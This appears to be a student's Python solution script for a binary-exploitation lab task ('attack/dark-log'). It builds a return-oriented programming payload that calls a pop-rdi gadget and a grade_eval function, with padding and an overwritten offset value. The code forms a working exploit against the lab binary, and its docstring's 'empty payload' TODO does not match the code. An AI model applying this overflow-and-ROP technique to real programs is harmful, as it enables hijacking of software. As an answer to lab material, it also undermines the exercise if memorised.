#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct


def p64(x):
    return struct.pack("<Q", x)

def p32(x):
    return struct.pack("<I", x)

POP_RDI_RET = 0x4018a3
GRADE_EVAL  = 0x401677
OFFSET_VAL  = 168          # 0xA8，使复制目标 = buffer + 0x80 + 168 = buffer + 296

# ROP: pop rdi; ret -> 4 -> grade_eval
rop  = p64(POP_RDI_RET)
rop += p64(4)              # grade_eval(4) 会输出 "Hope A will be your grade!"
rop += p64(GRADE_EVAL)

# 填充到 offset 位置（buffer + 256）
payload  = rop
payload += b"B" * (256 - len(rop))
payload += p32(OFFSET_VAL)


sys.stdout.buffer.write(payload)
